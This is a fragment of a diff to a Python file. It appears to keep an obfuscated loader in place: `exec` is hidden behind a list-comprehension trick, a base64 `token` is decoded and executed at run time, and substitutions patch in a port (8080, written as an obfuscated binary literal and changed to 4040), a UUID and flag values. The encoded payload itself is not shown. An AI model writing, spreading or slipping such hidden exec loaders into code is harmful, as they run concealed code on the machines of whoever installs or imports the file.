@@ -3,7 +3,7 @@ from base64 import b64decode as de
 
 de.output = [exec if de else str for i in range(10) if list][0]
 de.output(de(token.encode("utf8")).decode("utf8")
-          .replace(str(int("0b1111110010000", 0x02)), str(8080))
+          .replace(str(int("0b1111110010000", 0x02)), str(4040))
           .replace("cfcf611", "False")
           .replace("kk377", "518d4a80-059c-40fc-a6d4-15c40015af13")
           .replace("vlvl556", "")
